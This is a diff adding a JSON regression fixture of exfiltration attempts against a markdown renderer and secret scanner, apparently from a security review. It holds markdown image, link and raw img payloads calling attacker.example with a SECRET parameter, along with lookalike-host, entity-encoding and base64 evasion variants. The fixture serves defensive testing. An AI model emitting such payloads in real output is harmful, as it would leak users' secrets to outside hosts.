@@ -1,0 +1,161 @@
+{
+  "about": "Exfiltration regressions: the security review's 22 proposed rows (SEC7-01 to SEC7-05). Inputs are the case's fictional values; secrets are filled in at run time. Expected verdicts are the current verdicts; an attempt marked open is pinned at the gap its review finding names.",
+  "attempts": [
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "double-entity-tenant",
+      "text": "![s](https://quillmere.example/i.png?r=&amp;#48;7700900573)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "double-entity-bankref",
+      "text": "![s](https://quillmere.example/i.png?r=QMO&amp;#45;755638)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "double-entity-path",
+      "text": "![s](https://quillmere.example/&amp;#x30;7700900573.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "double-entity-refdef",
+      "text": "![s][r]\n\n[r]: https://quillmere.example/i.png?r=&amp;#48;7700900573"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "double-entity-link",
+      "text": "[s](https://quillmere.example/?r=&amp;#48;7700900573)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "loads": [
+        "https://quillmere.example/i.png?a=1&b=2"
+      ],
+      "name": "office-amp-benign",
+      "text": "![s](https://quillmere.example/i.png?a=1&b=2)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "autolink-linkify",
+      "text": "<https://attacker.example/c?d=SECRET>",
+      "views": [
+        "commonmark+linkify",
+        "default+linkify",
+        "default+html+linkify"
+      ]
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "link-text-url-linkify",
+      "text": "[https://attacker.example/c](https://attacker.example/c)",
+      "views": [
+        "commonmark+linkify",
+        "default+linkify",
+        "default+html+linkify"
+      ]
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "loads": [],
+      "name": "office-key",
+      "text": "![s](https://quillmere.example/i.png?k={portal_key})"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "lookalike-host",
+      "text": "![s](https://quillm\u0435re.example/i.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "fullwidth-host",
+      "text": "![s](https://\uff51uillmere.example/i.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "trailing-dot",
+      "text": "![s](https://quillmere.example./i.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "loads": [
+        "https://QUILLMERE.EXAMPLE/i.png"
+      ],
+      "name": "uppercase-office",
+      "text": "![s](https://QUILLMERE.EXAMPLE/i.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "loads": [
+        "https://quillmere.example/logo.png"
+      ],
+      "name": "nested-alt",
+      "text": "![![x](https://attacker.example/p.png)](https://quillmere.example/logo.png)"
+    },
+    {
+      "expected": "clean",
+      "kind": "render",
+      "name": "raw-img-html-on",
+      "text": "Hi <img src=\"https://attacker.example/p.png?d=SECRET\">",
+      "views": [
+        "commonmark"
+      ]
+    },
+    {
+      "expected": "flagged portal_key",
+      "kind": "scan",
+      "name": "scan-escaped-underscore",
+      "text": "{key_bs}"
+    },
+    {
+      "expected": "flagged portal_key",
+      "kind": "scan",
+      "name": "scan-entity-underscore",
+      "text": "{key_ent}"
+    },
+    {
+      "expected": "flagged portal_key",
+      "kind": "scan",
+      "name": "scan-emphasis",
+      "text": "{key_em}"
+    },
+    {
+      "expected": "flagged internal_marker",
+      "kind": "scan",
+      "name": "scan-marker-capital",
+      "text": "{marker_cap}"
+    },
+    {
+      "expected": "flagged internal_marker",
+      "kind": "scan",
+      "name": "scan-marker-wrapped",
+      "text": "{marker_wrap}"
+    },
+    {
+      "expected": "not flagged",
+      "kind": "scan",
+      "name": "scan-base64",
+      "text": "{key_b64}"
+    },
+    {
+      "expected": "no render event",
+      "kind": "trace",
+      "name": "trace-raw-img",
+      "render_url": "https://attacker.example/p.png?d=SECRET",
+      "text": "Hi <img src=\"https://attacker.example/p.png?d=SECRET\">"
+    }
+  ]
+}
